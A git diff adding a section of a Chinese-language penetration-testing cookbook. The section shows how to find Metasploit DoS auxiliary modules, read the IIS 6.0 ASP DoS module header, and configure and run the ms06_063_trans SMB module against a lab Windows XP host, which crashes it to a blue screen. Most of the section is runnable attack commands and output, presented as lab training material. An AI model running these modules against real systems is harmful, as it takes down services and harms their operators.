@@ -1475,3 +1475,188 @@ Host script results:
 ### 工作原理
 
 本练习中演示的 Nmap NSE 脚本是缓冲区溢出攻击的示例。 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。
+
+## 6.10 Metasploit DoS 攻击
+
+Metasploit框架有许多辅助模块脚本，可用于执行 DoS 攻击。 这个特定的秘籍演示了如何找到 DoS 模块，确定模块的使用方式，以及如何执行它们。
+
+### 准备
+
+为了使用 Metasploit 执行 DoS 攻击，你需要有一个运行漏洞服务的系统，它易受 Metasploit DoS 辅助模块之一的攻击。 所提供的示例使用 Windows XP 的实例。 有关设置 Windows 系统的更多信息，请参阅本书第一章中的“安装 Windows Server”秘籍。
+
+### 操作步骤
+
+在使用 Metasploit 辅助模块执行 DoS 测试之前，我们需要确定哪些 DoS 模块可用。 相关模块可以通过浏览 Metasploit 目录树来确定：
+
+```
+
+root@KaliLinux:~# cd /usr/share/metasploit-framework/modules/auxiliary/ dos/ 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos# ls cisco  dhcp  freebsd  hp  http  mdns  ntp  pptp  samba  scada  smtp  solaris  ssl  syslog  tcp  wifi  windows  wireshark 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos# cd windows/ 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows# ls appian  browser  ftp  games  http  llmnr  nat  rdp  smb  smtp  tftp 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows# cd http 
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows/http# ls ms10_065_ii6_asp_dos.rb  
+pi3web_isapi.rb 
+```
+
+
+通过浏览`/ modules / auxiliary / dos`目录，我们可以看到各种类别的 DoS 模块。 在提供的示例中，我们已浏览包含 Windows HTTP 拒绝服务漏洞的目录：
+
+```
+root@KaliLinux:/usr/share/metasploit-framework/modules/auxiliary/dos/ windows/http# cat ms10_065_ii6_asp_dos.rb | more 
+## 
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit 
+# web site for more information on licensing and terms of use. 
+#   http://metasploit.com/ 
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+   include Msf::Exploit::Remote::Tcp   
+   include Msf::Auxiliary::Dos
+   
+   def initialize(info = {})      
+   super(update_info(info,         
+        'Name'           => 'Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service',         
+        'Description'    => %q{               
+            The vulnerability allows remote unauthenticated attackers to force the IIS server            
+            to become unresponsive until the IIS service is restarted manually by the administrator.            
+            Required is that Active Server Pages are hosted by the IIS and that an ASP script reads            
+            out a Post Form value.         
+        },         
+        'Author'         =>            
+            [               
+                'Alligator Security Team',               
+                'Heyder Andrade <heyder[at]alligatorteam.org>',               
+                'Leandro Oliveira <leadro[at]alligatorteam.org>'            
+            ],         
+        'License'        => MSF_LICENSE,         
+        'References'     =>            
+            [               
+                [ 'CVE', '2010-1899' ],               
+                [ 'OSVDB', '67978'],               
+                [ 'MSB', 'MS10-065'],               
+                [ 'EDB', '15167' ]            
+            ],         
+        'DisclosureDate' => 'Sep 14 2010'))
+```
+
+为了从上到下读取脚本，我们应该对文件使用`cat`命令，然后通过管道输出到`more`工具。 脚本的顶部描述了它所利用的漏洞以及系统必须满足的条件。 我们还可以在 Metasploit 框架控制台中识别潜在的 DoS 漏洞。 要访问它，在终端中键入`msfconsole`：
+
+```
+root@KaliLinux:~# msfconsole # cowsay++
+ ____________
+< metasploit > 
+ -----------       
+       \   ,__,        
+        \  (oo)____           
+           (__)    )\              
+              ||--|| *
+              
+Large pentest? List, sort, group, tag and search your hosts and services in Metasploit Pro -- type 'go_pro' to launch it now.
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0] 
++ -- --=[ 1053 exploits - 590 auxiliary - 174 post 
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+msf > 
+```
+
+
+一旦打开，搜索命令可以与搜索项结合使用，来确定要使用的漏洞利用：
+
+```
+msf > search dos
+
+Matching Modules 
+================
+
+   Name                                                        Disclosure Date  Rank       Description   ----                                                        --------------  ----       ----------
+   auxiliary/admin/webmin/edit_html_fileaccess                 2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access   
+   auxiliary/dos/cisco/ios_http_percentpercent                 2000-04-26       normal     Cisco IOS HTTP GET /%% request Denial of Service   
+   auxiliary/dos/dhcp/isc_dhcpd_clientid                                        normal     ISC DHCP Zero Length ClientID Denial of Service Module   
+   auxiliary/dos/freebsd/nfsd/nfsd_mount                                        normal     FreeBSD Remote NFS RPC Request Denial of Service   
+   auxiliary/dos/hp/data_protector_rds                         2011-01-08       manual     HP Data Protector Manager RDS DOS   
+   auxiliary/dos/http/3com_superstack_switch                   2004-06-24       normal     3Com SuperStack Switch Denial of Service   
+   auxiliary/dos/http/apache_mod_isapi                         2010-03-05       normal     Apache mod_isapi <= 2.2.14 Dangling Pointer   
+   auxiliary/dos/http/apache_range_dos                         2011-08-19       normal     Apache Range header DoS (Apache Killer)   
+   auxiliary/dos/http/apache_tomcat_transfer_encoding          2010-07-09       normal     Apache Tomcat Transfer-Encoding Information Disclosure and DoS 
+```
+
+在提供的示例中，搜索项 dos 用于查询数据库。 返回一系列 DoS 辅助模块，并且包括每个 DoS 辅助模块的相对路径。 此相对路径可用于缩小搜索结果范围：
+
+```
+msf > search /dos/windows/smb/
+
+Matching Modules 
+================
+
+   Name                                                        Disclosure Date  Rank    Description   
+   ----                                                        --------------  ----    ----------   
+   auxiliary/dos/windows/smb/ms05_047_pnp                                       normal  Microsoft Plug and Play Service Registry Overflow   
+   auxiliary/dos/windows/smb/ms06_035_mailslot                 2006-07-11       normal  Microsoft SRV.SYS Mailslot Write Corruption   
+   auxiliary/dos/windows/smb/ms06_063_trans                                     normal  Microsoft SRV.SYS Pipe Transaction No Null   
+   auxiliary/dos/windows/smb/ms09_001_write                                     normal  Microsoft SRV.SYS WriteAndX Invalid DataOffset   
+   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                    normal  Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   
+   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                       normal  Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference   
+   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                   normal  Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop   
+   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                     normal  Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS   
+   auxiliary/dos/windows/smb/ms11_019_electbowser                               manual  Microsoft Windows Browser Pool DoS   
+   auxiliary/dos/windows/smb/rras_vls_null_deref               2006-06-14       normal  Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference   
+   auxiliary/dos/windows/smb/vista_negotiate_stop                               normal  Microsoft Vista SP0 SMB Negotiate Protocol DoS 
+```
+
+在查询`/ dos / windows / smb`的相对路径后，返回的唯一结果是此目录中的 DoS 模块。 目录组织良好，可用于有效地搜索与特定平台或服务相关的漏洞。 一旦我们决定使用哪个漏洞，我们可以使用`use`命令和模块的相对路径来选择它：
+
+```
+msf > use auxiliary/dos/windows/smb/ms06_063_trans 
+msf  auxiliary(ms06_063_trans) > show options
+
+Module options (auxiliary/dos/windows/smb/ms06_063_trans):
+   
+   Name   Current Setting  Required  Description   ----   
+   ---------------  --------  ----------   
+   RHOST                   yes       The target address   
+   RPORT  445              yes       Set the SMB service port
+```
+
+一旦选择了模块，`show options`命令可用于确定和/修改扫描配置。 此命令会显示四个列标题，包括`Name`, `Current Setting`, `Required`, 和 `Description`。 `Name`列表示每个可配置变量的名称。 `Current Setting`列列出任何给定变量的现有配置。  `Required`列表明任何给定变量是否需要值。 `Description`列描述每个变量的函数。 可以使用`set`命令并通过提供新值作为参数，来更改任何给定变量的值：
+
+```
+msf  auxiliary(ms06_063_trans) > set RHOST 172.16.36.134 
+ => 172.16.36.134 
+ msf  auxiliary(ms06_063_trans) > show options
+ 
+Module options (auxiliary/dos/windows/smb/ms06_063_trans):
+   
+   Name   Current Setting  Required  Description   
+   ----   ---------------  --------  ----------   
+   RHOST  172.16.36.134    yes       The target address   
+   RPORT  445              yes       Set the SMB service port 
+```
+
+在提供的示例中，`RHOST`值更改为我们打算扫描的远程系统的 IP 地址。 更新必要的变量后，可以使用`show options`命令再次验证配置。 一旦验证了所需的配置，可以使用`run`命令启动模块：
+
+```
+msf  auxiliary(ms06_063_trans) > run
+
+[*] Connecting to the target system... 
+[*] Sending bad SMB transaction request 1... 
+[*] Sending bad SMB transaction request 2... 
+[*] Sending bad SMB transaction request 3... 
+[*] Sending bad SMB transaction request 4... 
+[*] Sending bad SMB transaction request 5... 
+[*] Auxiliary module execution completed 
+```
+
+在执行 Metasploit DoS 辅助模块之后，返回的一系列消息表明已经执行了一系列恶意 SMB 事务，并且返回表示模块执行完成的最终消息。 该漏洞的成功可以通过查看 Windows XP 系统来验证，它已经崩溃，现在显示 BSOD：
+
+![](img/6-10-1.jpg)
+
+### 工作原理
+
+本练习中演示的 Metasploit DoS 辅助模块是缓冲区溢出攻击的示例。 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。
